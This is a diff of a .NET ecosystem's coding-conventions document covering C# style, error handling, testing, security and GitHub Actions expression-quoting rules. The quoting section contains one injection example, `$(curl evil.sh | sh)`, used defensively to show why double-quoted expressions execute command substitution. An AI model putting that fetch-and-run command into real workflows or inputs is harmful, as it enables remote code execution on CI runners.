+  branch with no open PR yet (a faster, less comprehensive benchmark run; the PR-triggered run does the full one). It is also
+  suggested to the user via a default input when the CI is triggered manually — with `workflow_dispatch`. Every other CI path
+  (`pull_request`, `push` to `main`) leaves `preprocessor-symbols` empty. Adding a new symbol is a deliberate ecosystem-wide
+  decision, not a per-repo convenience — propose it here first.
+
+### Dependency Management
+
+- **Use `Directory.Build.props` and `Directory.Packages.props`** for shared build configuration and centralized package
+  version management; `*.csproj` files reference packages without versions
+- **Restore with `dotnet restore --use-lock-file`** to pin exact versions; commit `packages.lock.json`
+- **Build with `dotnet restore --use-lock-file ... && dotnet build --no-restore ...`**
+- When dependencies change: update `Directory.Packages.props`, **AND** then run `dotnet restore --force-evaluate`, commit both
+  files
+- Dependabot watches `Directory.Packages.props`; after merging a Dependabot PR, run `dotnet restore --force-evaluate` (also done
+  by `RefreshLockFiles.yaml` and `AutoMerge.yaml`)
+
+### AOT and Trimming
 
 Scope via `Directory.Build.props` (folder-based conditions):
 
-- **Test and benchmark projects** — AOT and trim checks disabled; optimize for correctness/perf feedback:
-  `IsAotCompatible=false`, `VerifyReferenceAotCompatibility=false`, `EnableTrimAnalyzer=false`, `IsTrimmable=false`
-- **Product projects** — AOT and trim checks enabled, unless code or dependencies explicitly require otherwise:
+- **Test and benchmark projects** — AOT and trim checks are not enabled (using the SDK defaults)
+- **Product projects** — AOT and trim checks are enabled, unless code or dependencies explicitly require otherwise:
   `IsAotCompatible=true`, `VerifyReferenceAotCompatibility=true`, `EnableTrimAnalyzer=true`, `IsTrimmable=true`
 
 Diagnostic classification:
@@ -403,67 +197,368 @@ IL warning suppression policy:
 If strict AOT/trimming is not worth it for a specific product project, opt out explicitly in `*.csproj` with documented
 rationale in README/CHANGELOG/PR.
 
-## Git and PR Hygiene
+## Writing C\#
+
+### General C# Coding Conventions
+
+- **See the repo's `.editorconfig` first** — it is authoritative for style and analyzers
+- Use file-scoped namespaces
+- Use implicit usings for common namespaces (defined in `usings.cs`) or `<Using Include="..." />` in `*.csproj` and
+  `Directory.Build.props`
+- Use `record` for immutable data models and DTOs
+- Use `readonly record struct` for small immutable value objects (e.g. `Ulid`, `Result<T>`)
+- Use `internal` accessibility by default; **`public` only for intentional API surface**. To expose internal members to test
+  projects, use the `InternalsVisibleTo` attribute rather than making them `public`
+- Use `sealed` by default. Open **only** when extensibility is required and justified
+- Use **instance methods for a type's own algebra; extension methods only to adapt what you don't own.** A method's natural home
+  is ***inside*** the type when the type is yours and the method is part of its core behavior — it gets direct access to private
+  state (no widening the public surface just to feed a helper), it is discoverable on `.` without an import, and the type's
+  behavior stays cohesive in one file. Reach for an **extension method** when, and only when:
+
+  - the receiver is a type you **do not own** (`Task<T>`, `IEnumerable<T>`, `Func<>`, `Nullable<T>`, a third-party type) — you
+    *cannot* add an instance method, so lifting/adapting it (`.MapAsync`, `.Traverse`, `.ToResult`) **MUST** be an extension.
+    This is why LINQ and most FP combinators over BCL types are extensions;
+  - the operation is defined over a **pattern across several types** rather than one type (`Traverse`, `Sequence`, `Apply`), so
+    no single type is its home.
+
+  Do **not** scatter a type's own core operations (e.g. `Option<T>.Map`/`Bind`, `Result<T>.Ensure`/`Tap`) into external static
+  classes; keep them inside the type. When extensions are unavoidable, group them in one clearly named static class per concern
+  (`OptionExtensions`, `ResultAsyncExtensions`) so the out-of-type code is organized, not sprinkled.
+- **Compose, do not impersonate.** A type **MUST NOT** implement an interface (or expose a conversion) merely to borrow the
+  ergonomics that come with *being that thing* when it is not semantically *that thing*. Gain a capability from the *language
+  pattern* the feature binds to (compile-time duck typing, e.g. the query-expression pattern), not from a false `is-a`. For
+  example, support LINQ query syntax over a monad by giving it `Select`/`SelectMany`/`Where` **methods** rather than
+  implementing `IEnumerable<T>` — a monad (`Option<T>`, `Result<T>`, `Task<T>`) is **not** a collection, and claiming to be one
+  floods its surface with meaningless operators (`OrderBy`, `Zip`, `Chunk`), re-opens throwing extractors (`First`, `Single`)
+  that bypass the type's own safety, and boxes the value. This is distinct from *prefer composition over inheritance*: that rule
+  governs implementation **reuse** (`has-a` over `extends-a`); this one governs interface **honesty** (do not advertise an
+  identity you do not have).
+- Use expression-bodied members when trivial and readable (one-liners, simple getters)
+- Prefer `var` when the type is obvious from the right-hand side
+- **Always enable nullable reference types**; treat warnings as design feedback
+- **Avoid static mutable state** unless guarded with `System.Threading.Lock`; for read-mostly state, publish immutable snapshots
+  via `Interlocked.Exchange`. Use `ReaderWriterLockSlim` only when measurements justify it.
+- Prefer `[GeneratedRegex(...)]` partial methods over `new Regex(..., RegexOptions.Compiled)` for static patterns
+- Prefer **dependency injection** over service locator
+- Use `System.TimeProvider` (.NET 8+) for time abstraction; `FakeTimeProvider` in tests — **never** a homegrown `IClock`
+- Use guard clauses at method entry (throw early; no nested pyramids)
+- All public interfaces **MUST** validate their input parameters and throw appropriate exceptions (e.g., `ArgumentNullException`,
+  `ArgumentException`) for invalid arguments **even** if nullable references are enabled
+- Prefer pattern matching (`is`, `switch` expressions) over `if`/`else` chains when semantically clearer
+- Do not use curly braces for single-line blocks unless they improve readability
+- `#region` / `#endregion` are acceptable for logical grouping in larger files and for interface implementations
+
+#### Naming
+
+Follow the naming conventions from .editorconfig, e.g., PascalCase for types and methods, camelCase for locals and parameters.
+There are also a few rules for the following elements that cannot be defined in .editorconfig:
+
+- Prefer **domain-first public API type names** without suffixes unless required to avoid symbol conflicts
+- Commands: imperative — `PlaceOrderCommand`
+- Handlers: command name + `...Handler` suffix — `PlaceOrderCommandHandler`
+- Events: past tense + `Event` suffix — `OrderPlacedEvent`
+
+### Async
+
+- Suffix async methods with `Async`
+- Thread a `CancellationToken ct` through all async call chains
+- **No fire-and-forget** except documented background operations with proper error handling and logging
+- Use `ValueTask` only when allocation reduction is measurable (hot paths, cached results)
+- Library code **SHOULD** use `ConfigureAwait(false)` on every `await`. Without it, a consumer with a `SynchronizationContext`
+  (WPF, WinForms, legacy ASP.NET) that blocks on the returned task can deadlock. Application and test code need not.
+  (Analyzer `CA2007` can enforce it; with warnings as errors, scope it to product projects only.)
+- Use **async-only for I/O-bound surfaces.** Where an operation is genuinely I/O-bound, expose **only** the async form — no
+  synchronous twin. The only way to offer a sync twin over an async internal is sync-over-async (`.Result` /
+  `.GetAwaiter().GetResult()`), which risks thread-pool starvation and deadlocks; refusing the sync twin is refusing to
+  ship that hazard. (Precedent: the EF Core Cosmos DB provider is async-only and throws on synchronous calls.)
+- Scope the rule to genuinely I/O-bound work. Code **MUST NOT** fake async over CPU-bound or in-memory work (no `Task.Run`
+  wrappers to present an async face); pure-computation packages stay synchronous.
+- An inherited or otherwise unavoidable synchronous seam (e.g. a sync interface member the type **MUST** implement) **MUST**
+  throw a clear usage exception (e.g. "this API is async-only; call `…Async`"), never silently block via sync-over-async.
+- Prefer the asynchronous BCL interfaces — `IAsyncDisposable` over `IDisposable`, `IAsyncEnumerable<T>` over
+  `IEnumerable<T>` — so async-only surfaces have no synchronous dead ends.
+- A library **MUST NOT** ship sync-over-async on a consumer's behalf. A consumer trapped in an inherently synchronous context
+  owns that bridge; the library does not relocate the hazard into itself.
+
+### Error Handling
+
+**The governing rule — exceptions guard the contract; results carry outcomes:**
+
+> An **exception** means *the caller or the environment is broken*: a precondition was violated (a caller bug) or the machine
+> failed (a catastrophe). A **`Result<T>`** means *the operation executed correctly and legitimately did not succeed* — a normal
+> alternate outcome the caller is expected to branch on.
+
+The deciding axis is **contractual outcome vs. contract violation**, **NOT** *recoverable vs. unrecoverable*. A failure
+**MAY** be unrecoverable and still be a `Result` (for signature visibility, allocation cost, and error accumulation); a
+failure **MAY** be trivially recoverable and still be an exception, because it was a caller bug.
+
+- Expected, correct-usage failures (not-found, business-invariant violation, etc.) **SHOULD** be modeled as `Result<T>`.
+- Caller mistakes — invalid arguments, violated preconditions the caller could have checked upfront, API misuse — **MUST**
+  throw (the `ArgumentException` family). Fail fast and loud; these are bugs, not outcomes. This is **argument
+  validation** and is distinct from **invariant validation** (below), which returns a `Result`.
+- Unrecoverable or catastrophic failures (I/O loss, OOM) **MUST** propagate to a single top-level boundary handler. Code **MUST
+  NOT** wrap every call in `try`/`catch`, and **MUST NOT** catch base-class `Exception` to repackage it as a `Result` — that
+  hides bugs and catastrophes that **MUST** surface loudly. Convert an exception to a `Result` only at a specific boundary,
+  catching a **specific, known** exception type that represents an expected outcome (e.g. via a `Try(...)` combinator).
+- **MUST NOT use exceptions for expected control flow.** **MUST NOT swallow exceptions** — at minimum log or rethrow.
+
+#### `Result<T>` and railway-oriented programming (ROP)
+
+- `Result<T>` and its `Error` hierarchy live in **`vm2.Functional`**. `Result<T>` is a `readonly record struct`; `Error` is a
+  polymorphic class hierarchy matched (via `switch`) at the boundary — the ROP analogue of a `catch` series.
+- Compose fallible steps with combinators (`Bind`, `Map`, `Ensure`, `Tap`, `Match`). The upstream-failure short-circuit
+  **MUST** live in the combinators, written once; business functions take the **unwrapped** value and return `Result<T>`, and
+  **MUST NOT** re-check upstream failure. Inside a pipeline, `Match` is the only place where it leaves the rails. Adapter
+  layers at the API boundary (the `bool TryDo` and `Do` forms below) **MAY** read `IsSuccess`/`Value` directly.
+- Invariant validation **MUST** accumulate **all** failures into one `AggregateError` (applicative), not just the first.
+- The property `Error.Code`, when present, is a **stable, external contract** for consumers that cannot see the CLR type (API
+  clients, localization, telemetry). It **SHOULD** be namespaced as `<resource>.<kind>` (e.g. `order.not_found`,
+  `file.not_found`) and match its granularity to how consumers branch. Derive its value from a stable **domain term**, not from
+  the CLR type name. Each code's value **SHOULD** be defined as a `public const string` (e.g.,
+  `public const string ErrorCode = "order.not_found";`) and passed to the base constructor, so consumers can match on it in
+  `switch` patterns without repeating the literal; a type with several codes exposes one constant per code. The code **MAY** be
+  omitted entirely for purely internal errors (discriminate by type instead). For coarse in-process handling shared across
+  several codes, you **MAY** also use a marker interface (e.g. `INotFoundError`) alongside the specific `Code`.
+
+#### The `Do` / `TryDo` pattern
+
+When an operation's failure may be *either* a caller bug *or* an expected outcome depending on the call site, prefer exposing
+**all three** forms (generalizing the BCL's `Parse`/`TryParse` pair, with a third, functional form as the core: a `TryDo`
+overload that returns `Result<T>`):
+
+1. `Result<T> TryDo(...)` — core implementation. Use at **boundaries** (untrusted input, optional presence) where a failure is
+   an expected outcome to branch on. This **SHOULD** be the default layer for FP-aware code.  For example:
+
+    ```csharp
+    Result<T> TryDo(...) { /* core logic */ return outcome; }
+
+    ...
+    // caller:
+    return TryDo(...).Match(
+                          onSuccess: value => Render(value),        // e.g. returns a JSON string
+                          onFailure: error => RenderError(error)    // also returns a JSON string representing the error
+                        );
+    ```
+
+1. `bool TryDo(..., out T value)` — this is the classic .NET pattern for expected failures without exceptions. For example,
+   `int.TryParse`. This method **SHOULD** invoke the `TryDo` from the FP layer and **SHOULD NOT** implement the logic
+   itself. It returns `true` on success, `false` on failure, and **MUST NOT** throw for expected failures; it **MAY** throw for
+   caller bugs. Offer this form only when the operation has one failure mode, or callers never need to
+   tell the modes apart. For example:
+
+    ```csharp
+    bool TryDo(..., [MaybeNullWhen(false)] out T value)
+    {
+        var result = TryDo(...);
+
+        value = result.IsSuccess ? result.Value : default;
+
+        // note: there is no information about the error itself
+        return result.IsSuccess;
+    }
+
+    ...
+    // caller:
+    if (!TryDo(..., out var value))
+      HandleFailure();
+    ```
+
+1. `T Do(...)` — the bare-named method throws an exception on failure. Use at **trusted internal call sites** where a failure is
+   a bug or by consumers who prefer exceptions over `Result<T>`. The thrown exception **SHOULD** carry the full failure detail
+   (e.g. every validation failure, like a good parser). For example:
+
+    ```csharp
+    T Do(...) => TryDo(...).Match(
+                                onSuccess: v => v,
+                                onFailure: e => e.Code switch {
+                                                    AbcError.ErrorCode => throw new AbcException(e.Message),
+                                                    XyzError.ErrorCode => throw new XyzException(e.Message),
+                                                    _ => throw new CatchAllException(e.Message) } );
+
+    ...
+    // caller:
+    try
+    {
+        var value = Do(...);
+        ...
+    }
+    catch (AbcException) { /* handle */ }
+    catch (XyzException) { /* handle */ }
+    catch (CatchAllException) { /* handle */ }
+    ```
+
+Concrete instances: `Validate` / `TryValidate`, `Find` / `TryFind`, `Get` / `TryGet`. The layered forms make the functional
+dependency **opt-in**:
+
+- a consumer who does not want railway-oriented code uses the throwing `Do` form, catches ordinary exceptions, and never uses
+  `vm2.Functional`'s types
+- a consumer who prefers the classic .NET pattern uses `bool TryDo(..., out var value)` and likewise never uses
+  `vm2.Functional`'s types
+- `Result<T> TryDo(...)` is for consumers who opt into `Result` and FP patterns
+
+> [!IMPORTANT]
+>
+> - `async` methods cannot have `out` parameters, so the `bool` form has no async counterpart: use
+>   `Task<Result<T>> TryDoAsync(..., CancellationToken ct)` instead.
+> - A `ref struct` (e.g. `Span<T>`) cannot be the `T` of `Result<T>`, cannot be captured by the combinators' lambdas, and
+>   cannot be a parameter of an async method. Span-based sync operations keep their logic in a non-lambda core; async
+>   operations take `Memory<T>`/`ReadOnlyMemory<T>` instead.
+
+### API surface vs. inner workings
+
+- Opinionated third-party libraries (e.g. FluentValidation) are **implementation details**. They **MUST NOT** appear on the
+  public surface; wrap them behind a clean vm2 interface (`IValidatable`) so consumers see `Result` / `Validate`, never the
+  library's vocabulary.
+- The public surface **MUST** expose only vm2-owned outcome types (`Result<T>`, `Error`). Code **MUST NOT** surface a
+  third-party `Result` / `Either` / `OneOf` type — its version bumps would become your breaking changes.
+- A type on a **published** API surface is a binary-compatibility commitment. A `vm2.Functional` type **MUST** be stabilized
+  (shape locked, edge cases such as the `default(Result<T>)` state decided, tests in place) **before** it appears on a
+  published stable signature.
+  <!-- TODO: enforce the commitment. `EnablePackageValidation` is on, but without `PackageValidationBaselineVersion` it only
+  checks consistency between the TFMs of the current package, never against the last published version. Options: set the
+  baseline, and/or `Microsoft.CodeAnalysis.PublicApiAnalyzers` (PublicAPI.Shipped.txt / PublicAPI.Unshipped.txt).
+  Preferred: `pack.sh` derives the baseline at pack time, never committed: the last stable version that the feed actually
+  serves (`dotnet package search <id> --exact-match`; or `git describe` from `HEAD^` as a fallback), passed as
+  `-p:PackageValidationBaselineVersion=...`, and omitted when nothing is published yet. Run it in `_pack.yaml` too, so a
+  breaking PR fails in CI; an intentional break commits a `CompatibilitySuppressions.xml`. Details: vm2.DevOps
+  scratch-todo.md, item O. Decide in a separate PR, then replace this TODO with one rule. -->
+- Async surfaces are `ValueTask<Result<T>>` / `Task<Result<T>>`; the async combinator family (`BindAsync`, `MapAsync`,
+  `EnsureAsync`) **MUST** be provided so the double-wrapped result composes without hand-unwrapping.
+
+### Logging and Observability
+
+- **MUST use `ILogger<T>`** with structured logging (message templates with named placeholders, never interpolated strings); use
+  `[LoggerMessage]` source-generated methods on hot paths.
+- **MUST NOT log sensitive data** (PII, secrets, etc.). **Use logger scopes** for context; never string concatenation in
+  messages.
+
+### Performance
+
+- `AsNoTracking()` for read-only EF queries
+- Prefer lazy evaluation with iterators (`yield return`) over eager materialization for sequences
+- Prefer lazy initialization (`Lazy<T>`, `Lazy<T>(LazyThreadSafetyMode.*)`) for expensive objects
+- No unnecessary `ToList()` inside query pipelines
+- `ReadOnlySpan<char>` for parsing hot paths
+- `stackalloc` for small buffers with heap fallback for large inputs
+
+### Security
+
+- No embedded secrets — secure storage, user secrets, or environment variables only
+- Validate all external inputs at system boundaries
+- Principle of least privilege throughout
+- Prefer quantum-resistant algorithms for cryptography where applicable
+- **Use a URN for the unique identifier of a resource that we own and define** — an XML schema or namespace, a serialization
+  format, an encryption key, an organizational resource, etc. (e.g., `urn:schemas-vm-com:Linq-Expressions-Serialization-Json`).
+  A URN names the resource without implying it can be retrieved over the network, which a URL does. Storage keys are a separate
+  choice: a database key may be a ULID or a GUID, and the URN can serve as the external, human-meaningful identity — the
+  business key.
+- **Identifiers of shared, registered dialects keep their official form.** A JSON Schema's `$schema` **MUST** be the
+  registered meta-schema URI (e.g. `https://json-schema.org/draft/2020-12/schema`), because validators match that exact
+  string. Replacing it with a repository URN would prevent the dialect from being recognized.
+- **Fetchability is a security decision, not a naming one.** Some schema and XML tooling automatically dereferences a `$schema`,
+  `$ref`, or namespace URI found in a document. That is the same class of hazard as XXE in XML parsers: an attacker-influenced
+  or later-hijacked URL can become an SSRF vector (an internal service, a cloud metadata endpoint, a `file://` path) the moment
+  such a tool processes the file. Resolve identifiers through an explicit, developer-controlled mapping (e.g. VSCode's
+  `json.schemas` setting, matched by file glob), not an implicit network call.
+- **Any other `http(s)://` identifier used for a resource MUST be justified** with a comment or documentation explaining
+  why it is needed and why automatic fetching is safe there.
+
+### Services
+
+- Use async service APIs. Service contracts cross network boundaries and are I/O-bound by nature.
+- Within a cluster, prefer gRPC and messaging over HTTP/REST for performance and reliability
+- Prefer circuit breakers and retries over exceptions for transient faults; a transient fault handled by a resilience pipeline
+  (e.g. optimistic-concurrency retry) **MAY** be surfaced as an exception, because the resilience layer is exception-shaped.
+- Use health checks and OpenTelemetry for observability, not exceptions.
+- Export logs through OpenTelemetry (`AddOpenTelemetry` on the logging builder), so log records correlate with traces and
+  metrics.
+
+## Verifying
+
+### Testing
+
+- Framework: **xUnit v3 with Microsoft Testing Platform (MTP) v2**
+- Assertions: **FluentAssertions** (never `Assert.*` unless framework-specific)
+- Mocks: **NSubstitute**
+- Use **vm2.TestUtilities**:
+  - `TestUtilities.PathLine()` — locates failing theory tests
+  - `XUnitLogger` — captures structured logs without a real logger
+  - `TestBase`:
+    - holds an ITestOutputHelper `private` member and exposes it as the `protected` property `TestBase.Out` for use in the tests
+      inheriting from `TestBase`
+    - suppresses `FluentAssertions` licensing noise
+    - gets `FluentAssertionsExceptionFormatter` which enables the display of inner exceptions in `FluentAssertions` failures
+- Test naming:
+  - Sync:  `MethodName_WhenCondition_ShouldOutcome`
+  - Async: `MethodName_WhenCondition_ShouldOutcome_Async`
+- Arrange / Act / Assert with clear blank-line separation
+- One logical assertion per test (chained FluentAssertions counts as one)
+- Prefer `[Theory]` with inline data; use `[MemberData]` or `[ClassData]` for complex scenarios
+- No testing of implementation details; mock only observable behavior
+- `[Trait("Category","Integration")]` for slow or external-dependency tests
+- Inject mock clock, e.g., `FakeTimeProvider` — never `DateTime.UtcNow` directly in tests
+- Inject mock ID providers — never rely on live generation in tests
+- Mock only external collaborators (I/O, time, random, repository, bus); never mock value objects
+- Strive for 80% code coverage on critical paths; prioritize meaningful tests over coverage numbers
+- Upload coverage to Codecov
+- **Equality-contract tests for every value type.** Any type that defines value equality (`record`,
+  `record struct`, or a `struct`/`class` overriding `Equals`/`GetHashCode`/`==`) **MUST** have tests pinning the
+  contract:
+  - **reflexivity** (`a == a`)
+  - **symmetry** (if `a == b` then `b == a`)
+  - **transitivity** (if `a == b` and `b == c` then `a == c`)
+  - `Equals`/`==` agreement (if `a.Equals(b)` then `a == b`)
+  - `GetHashCode` consistency (equal values hash equal: `a == b` implies `a.GetHashCode() == b.GetHashCode()`)
+- A type that is **not** meant to be compared **MUST** make that explicit (do not silently rely on the reflection-based
+  `ValueType.Equals` fallback — it boxes and is a hidden performance trap). This applies to domain value objects and to library
+  primitives alike.
+- **Algebraic-law tests for every monadic (or otherwise law-bearing) type.** A type that claims to be a monad,
+  functor, applicative, monoid, etc. **MUST** have tests proving the corresponding laws hold
+
+  - for a monad:
+    - functor identity (`m.Map(x => x) == m`)
+    - left identity (`Return(a).Bind(f) == f(a)`)
+    - right identity (`m.Bind(Return) == m`)
+    - associativity (`(m.Bind(f)).Bind(g) == m.Bind(x => f(x).Bind(g))`)
+    - `Map`/`Bind` consistency (`m.Map(f) == m.Bind(x => Return(f(x)))`)
+
+  These are trivial to verify for simple types and essential for complex ones (e.g. a parser's `Bind`); write them
+  **regardless**, as executable specification.
+- Prefer `[Theory]` with representative functions/inputs for simple types; reach for property-based generation (FsCheck/CsCheck)
+  where the input space is large.
+
+### Performance Benchmarks
+
+- Framework: **BenchmarkDotNet**
+<!-- TODO:
+- Derive from `BenchmarkBase` to inherit consistent `MemoryDiagnoser`, `GcServer`, and other attributes. Currently implemented
+only in vm2.Glob's benchmarks. Separate in a reusable assembly later.
+-->
+- Benchmark hot paths and critical scenarios, not every method
+- Use `GlobalSetup` for expensive initialization; `IterationSetup` for per-iteration setup
+- Use `Params` for parameterized benchmarks to compare inputs
+- Upload results to Bencher for regression tracking
+
+## Shipping
+
+### Git and PR Hygiene
 
 - Commit messages: `<type>[(scope)][!]: <description>` — `!` marks a breaking change
   - `fix: correct null reference in UserService`
   - `feat(serialization): add IUtf8SpanFormattable implementation`
-- One logical concern per PR
+  - Allowed types in commit messages are listed in `$allowed_commit_types` (`vm2.DevOps/scripts/bash/lib/_constants.sh`).
+- If a PR addresses more than one logical concern, **reject it** and request that it be split — do not approve or suggest
+  improvements until the scope is reduced to one concern. The exception is a repository's initial PR.
 - **Review source files over 500 lines for possible splitting.** Length is a smell, not a verdict: a file with one
-  cohesive responsibility may stay long. Such a file SHOULD say so in its header comment, for example
+  cohesive responsibility may stay long. Such a file **SHOULD** say so in its header comment, for example
   `# length-review: keep together -- <one-sentence reason>`, so a reviewer (human or AI) knows the length is deliberate.
-  The PR description MAY also discuss the decision when it is worth a reviewer's attention.
+  The PR description **MAY** also discuss the decision when it is worth a reviewer's attention.
 - **Credit AI co-authorship.** When an AI coding assistant materially contributed to a commit (wrote or substantially
   shaped the code, tests, or docs), add a `Co-Authored-By:` trailer at the end of the commit message naming the
-  assistant, e.g. `Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>`. This keeps authorship honest and the
+  assistant, e.g. `Co-Authored-By: Claude <model> <noreply@anthropic.com>`. This keeps authorship honest and the
   history auditable; it is not optional vanity — it records who (or what) actually shaped the change.
 
-## Documentation
-
-- **Technical and specification documents** MUST include the RFC 2119 boilerplate:
-  "The key words **MUST**, **MUST NOT**, **SHOULD**, **SHOULD NOT**, and **MAY** in this document are to be interpreted
-  as described in [RFC 2119](https://www.rfc-editor.org/rfc/rfc2119)."
-- **Blogs and free-form articles** (`docs/blog-*.md`) MUST NOT use RFC 2119 keywords as normative terms
-- Use clear, concise, idiomatic language; prefer active voice and direct statements
-- Explain the *why* and intent behind decisions, not just the *what*
-- **XML docs on all public API surface**
-- Line length: 128 characters maximum
-- XML tags on their own lines unless the entire XML element fits on one line
-- **Cite specifications** (POSIX, RFC, SemVer, ULID spec, etc.) with title and URL
-- **README code examples must be self-contained and runnable**: include all `using` directives, declare all variables,
-  avoid unexplained placeholders. A reader must be able to paste the example and have it compile
-- Standard references block:
-
-## References
-
-- [Title](URL) — Author or organization
-
-### Markdown
-
-- Follow markdownlint default rules (or `.markdownlint.json` if present)
-- **Align table columns with spaces** for readability in raw Markdown
-- 4-space indentation for code blocks inside Markdown
-- **Use `1.` for all items in ordered lists** (renderers number automatically)
-- Prefer kebab-case in YAML; avoid snake_case unless required by an external schema
-
-## File Modification
-
-- **Edit shared files at their canonical source, never in a consumer repo.** Files synced by `diff-shared.sh` (mapped in
-  `diff-shared.config.json`) are sourced from `vm2.Templates` (the `AddNewPackage` content). Edit the canonical copy
-  first, then propagate with `diff-shared.sh`.
-  - Action **`copy`** (`.editorconfig`, `.gitignore`, `.gitattributes`, `.gitmessage`, `CONVENTIONS.md`, `global.json`,
-    `LICENSE`, `NuGet.config`, `dependabot.yml`, the `cliff.*` configs, and several workflows — see the config for the
-    authoritative list): **100% shared and overwritten verbatim.** A direct edit in a consumer repo MUST NOT be made —
-    the next `diff-shared.sh` run silently clobbers it.
-  - Action **`ask to merge`** (`CI`/`Prerelease`/`Release` workflows, `Directory.Build.props`, `Directory.Packages.props`,
-    `copilot-instructions.md`): partially shared — still edit the canonical copy first, then merge; keep repo-specific
-    overrides in the consumer repo.
-- **Preserve existing comments** unless correcting inaccuracies or improving English
-- Do not remove commented-out code without explicit permission
-- Preserve YAML/JSON comments in configuration files
-- For GitHub Actions workflows: preserve commented-out alternatives and explanatory notes
-
-## CI / GitHub Actions
+### CI / GitHub Actions
 
 When adding a new project, register it in `.github/workflows/CI.yaml`:
 
@@ -476,7 +571,7 @@ When adding a new project, register it in `.github/workflows/CI.yaml`:
 
 Also add the project to the `.slnx` solution file under the appropriate folder.
 
-### Quoting GitHub Actions Expressions in Shell Steps
+#### Quoting GitHub Actions Expressions in Shell Steps
 
 GitHub substitutes a `${{ ... }}` expression as literal text **before** the shell parses the line — the shell never
 sees the expression syntax itself, only whatever string came out of it. This makes the quoting around it a real
@@ -485,11 +580,11 @@ security boundary, not a style choice.
 - **`inputs.*` (`workflow_call` and `workflow_dispatch`) MUST always go through the step's (or the job's or the workflow's)
   `env:`, then reference the resulting shell variable — no exceptions, no per-value judgment call.** This is the only pattern
   immune to injection regardless of what the value contains, because GitHub Actions writes `env:` values into the runner's
-  environment directly — the shell reads them as inert data and never re-parses them for metacharacters, quotes, or
-  command substitution. Deciding case by case whether a *particular* input is "safe enough" to skip this is exactly
-  how `reason` and `bencher-branch` shipped single-quoted directly in this repo's own reusable workflows: the value
-  looked bounded at the time, or became less bounded later without the `run:` step itself changing. `inputs.*` is
-  the one category where that risk is real enough to make `env:` unconditional.
+  environment directly — the shell reads them as inert data and never re-parses them for metacharacters, quotes, or command
+  substitution. Deciding case by case whether a *particular* input is "safe enough" to skip this is exactly how `reason` and
+  `bencher-branch` shipped single-quoted directly in `vm2.DevOps`'s own reusable workflows: the value looked bounded at the time,
+  or became less bounded later without the `run:` step itself changing. `inputs.*` is the one category where that risk is real
+  enough to make `env:` unconditional.
 
   ```yaml
   # Always: every inputs.* (and github.head_ref/ref_name -- see below) goes through env:
@@ -506,79 +601,73 @@ security boundary, not a style choice.
         )
   ```
 
-- **`env.*`, `secrets.*`, and `vars.*` MAY be single-quoted `'${{ ... }}'` directly — they are written by whoever
-  has admin/write access to the repo (Settings → Variables/Secrets, or the workflow file's own `env:` block), never
-  by a `workflow_dispatch` input or PR content, so they sit outside the threat model this rule defends against.**
-  This is the same reasoning that already exempts `github.actor` and `github.event_name` below, generalized to the
-  other admin-controlled surfaces. **Caveat:** an `env.*` entry is only safe under this exception when *its own*
-  value is a literal string or itself `vars.*`/`secrets.*` — not when it merely forwards an `inputs.*` value one
-  level removed (e.g. a workflow-level `env: FOO: ${{ inputs.foo }}`, then `${{ env.FOO }}` used in a script). That
-  case carries `inputs.*`'s own risk and MUST follow the `inputs.*` rule above, not this one.
-- **`needs.*` and `steps.*` (job/step outputs, results, and conclusions) SHOULD go through `env:` by default, but
-  this is a preference, not an absolute.** Unlike `inputs.*`, some of these are provably safe on their own terms —
-  `needs.<job>.result`/`steps.<step>.conclusion` are platform-computed enums with a fixed vocabulary, no different
-  in kind from `github.event_name`. The default is `env:` because *verifying* which case you're in — "is this output
-  merely forwarding an `inputs.*` value, or is it independently safe?" — is exactly the error-prone tracking this
-  document exists to avoid; reach for `env:` first and skip it only when you can point to a specific, obvious reason
-  the value can't escape (and it costs nothing to route it anyway if you're unsure).
+- **`env.*`, `secrets.*`, and `vars.*` MAY be single-quoted `'${{ ... }}'` directly — they are written by whoever has admin/
+  write access to the repo (Settings → Variables/Secrets, or the workflow file's own `env:` block), never by a
+  `workflow_dispatch` input or PR content, so they sit outside the threat model this rule defends against.** This is the same
+  reasoning that already exempts `github.actor` and `github.event_name` below, generalized to the other admin-controlled
+  surfaces. **Caveat:** an `env.*` entry is only safe under this exception when *its own* value is a literal string or itself
+  `vars.*`/`secrets.*` — not when it merely forwards an `inputs.*` value one level removed (e.g. a workflow-level
+  `env: FOO: ${{ inputs.foo }}`, then `${{ env.FOO }}` used in a script). That case carries `inputs.*`'s own risk and **MUST**
+  follow the `inputs.*` rule above, not this one.
+- **`needs.*` and `steps.*` (job/step outputs, results, and conclusions) SHOULD go through `env:` by default, but this is a
+  preference, not an absolute.** Unlike `inputs.*`, some of these are provably safe on their own terms — `needs.<job>.result`/
+  `steps.<step>.conclusion` are platform-computed enums with a fixed vocabulary, no different in kind from `github.event_name`.
+  The default is `env:` because *verifying* which case you're in — "is this output merely forwarding an `inputs.*` value, or is
+  it independently safe?" — is exactly the error-prone tracking this document exists to avoid; reach for `env:` first and skip
+  it only when you can point to a specific, obvious reason the value can't escape (and it costs nothing to route it anyway if
+  you're unsure).
 - **Pre-approved, unconditionally safe: `github.actor`** (a platform-enforced identity string — GitHub usernames and
-  `<name>[bot]` app logins cannot contain a `'`, by GitHub's own account/app-registration rules, so there is nothing
-  to escape), **`github.event_name`** (a fixed enum GitHub itself defines), and **a literal boolean/numeric
-  constant**. These MAY be single-quoted directly with no caveat.
-- **Exception to the `env.*`/`github.*` exemption: `github.head_ref` and `github.ref_name` still MUST go through
-  `env:`.** Git ref and branch names are allowed to contain `'` — unlike `github.actor`, there is no platform-level
-  character restriction, and a fork PR's branch name is attacker-influenceable. Don't let "it's a `github.*`
-  context" be mistaken for "it's on the safe list."
-- **Double-quoting `"${{ ... }}"` directly in the script is never correct, for anything, ever — even for a value
-  that would otherwise be safe to single-quote.** Bash evaluates `$()`/backtick command substitution inside double
-  quotes, so a value containing one (`$(curl evil.sh | sh)`) executes it outright — this is strictly worse than
-  single-quoting an unsafe value, which at least requires a literal `'` to break out rather than a `$(`.
+  `<name>[bot]` app logins cannot contain a `'`, by GitHub's own account/app-registration rules, so there is nothing to escape),
+  **`github.event_name`** (a fixed enum GitHub itself defines), and **a literal boolean/numeric constant**. These **MAY** be
+  single-quoted directly with no caveat.
+- **Exception to the `env.*`/`github.*` exemption: `github.head_ref` and `github.ref_name` still MUST go through `env:`.** Git
+  ref and branch names are allowed to contain `'` — unlike `github.actor`, there is no platform-level character restriction, and
+  a fork PR's branch name is attacker-influenceable. Don't let "it's a `github.*` context" be mistaken for "it's on the safe
+  list."
